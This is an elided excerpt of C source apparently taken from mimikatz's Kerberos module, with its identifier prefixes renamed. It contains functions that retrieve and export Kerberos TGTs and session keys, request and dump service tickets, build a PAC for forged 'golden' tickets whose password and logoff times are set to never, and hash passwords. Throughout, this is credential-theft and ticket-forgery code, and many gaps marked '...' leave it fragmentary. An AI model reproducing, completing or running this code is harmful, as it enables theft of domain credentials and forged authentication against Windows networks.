...
NTSTATUS kuhl_m_kerberos_tgt(int argc, wchar_t * argv[])
{
	...
	DWORD szData;
	MANGO_KERBEROS_TICKET mangoTicket = {0};
	DWORD i;
	BOOL isNull = FALSE;
	...
	if(NT_SUCCESS(status))
	{
		if(NT_SUCCESS(packageStatus))
		{
			mangoTicket.ServiceName = pKerbRetrieveResponse->Ticket.ServiceName;
			mangoTicket.TargetName = pKerbRetrieveResponse->Ticket.TargetName;
			mangoTicket.ClientName = pKerbRetrieveResponse->Ticket.ClientName;
			mangoTicket.DomainName = pKerbRetrieveResponse->Ticket.DomainName;
			mangoTicket.TargetDomainName = pKerbRetrieveResponse->Ticket.TargetDomainName;
			mangoTicket.AltTargetDomainName = pKerbRetrieveResponse->Ticket.AltTargetDomainName;
			mangoTicket.TicketFlags = pKerbRetrieveResponse->Ticket.TicketFlags;
			mangoTicket.KeyType = mangoTicket.TicketEncType = pKerbRetrieveResponse->Ticket.SessionKey.KeyType; // TicketEncType not in response
			mangoTicket.Key.Length = pKerbRetrieveResponse->Ticket.SessionKey.Length;
			mangoTicket.Key.Value = pKerbRetrieveResponse->Ticket.SessionKey.Value;
			mangoTicket.StartTime = *(PFILETIME) &pKerbRetrieveResponse->Ticket.StartTime;
			mangoTicket.EndTime = *(PFILETIME) &pKerbRetrieveResponse->Ticket.EndTime;
			mangoTicket.RenewUntil = *(PFILETIME) &pKerbRetrieveResponse->Ticket.RenewUntil;
			mangoTicket.Ticket.Length = pKerbRetrieveResponse->Ticket.EncodedTicketSize;
			mangoTicket.Ticket.Value = pKerbRetrieveResponse->Ticket.EncodedTicket;
			kuhl_m_kerberos_ticket_display(&mangoTicket, TRUE, FALSE);
			
			for(i = 0; !isNull && (i < mangoTicket.Key.Length); i++) // a revoir
				isNull |= !mangoTicket.Key.Value[i];
			if(isNull)
				...
				if(export)
				{
					...
					if(pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST) LocalAlloc(LPTR, szData)) // LPTR implicates KERB_ETYPE_NULL
					{
						...
						if(NT_SUCCESS(status))
						{
							if(NT_SUCCESS(packageStatus))
							{
								if(filename = kuhl_m_kerberos_generateFileName(i, &pKerbCacheResponse->Tickets[i], zwan_KERBEROS_EXT))
								{
...
NTSTATUS kuhl_m_kerberos_ask(int argc, wchar_t * argv[])
{
	...
	PKERB_RETRIEVE_TKT_REQUEST pKerbRetrieveRequest;
	PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
	MANGO_KERBEROS_TICKET ticket = {0};
	DWORD szData;
	USHORT dwTarget;
		...
		if(pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST) LocalAlloc(LPTR, szData))
		{
			...
			if(NT_SUCCESS(status))
			{
				if(NT_SUCCESS(packageStatus))
				{
					...
					if(isExport)
						filename = kuhl_m_kerberos_generateFileName_short(&ticket, zwan_KERBEROS_EXT);
...
wchar_t * kuhl_m_kerberos_generateFileName_short(PMANGO_KERBEROS_TICKET ticket, LPCWSTR ext)
{
	wchar_t * buffer;
	size_t charCount = 0x1000;
...
PBERVAL kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWSTR LogonDomainName, LPCWSTR servicename, LPCWSTR targetname, PKUHL_M_KERBEROS_LIFETIME_DATA lifetime, PISID sid, LPCBYTE key, DWORD keySize, DWORD keyType, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids, DWORD rodc, PCLAIMS_SET pClaimsSet)
{
	...
	MANGO_NEVERTIME(&validationInfo.LogoffTime);
	MANGO_NEVERTIME(&validationInfo.KickOffTime);
	MANGO_NEVERTIME(&validationInfo.PasswordLastSet);
	MANGO_NEVERTIME(&validationInfo.PasswordCanChange);
	MANGO_NEVERTIME(&validationInfo.PasswordMustChange);
...
NTSTATUS kuhl_m_kerberos_hash_data(LONG keyType, PCUNICODE_STRING pString, PCUNICODE_STRING pSalt, DWORD count)
{
	...
	if(NT_SUCCESS(status))
	{
		...
		{
			status = (zwan_NT_MAJOR_VERSION < 6) ? pCSystem->HashPassword_NT5(pString, buffer) : pCSystem->HashPassword_NT6(pString, pSalt, count, buffer);
			if(NT_SUCCESS(status))
			{
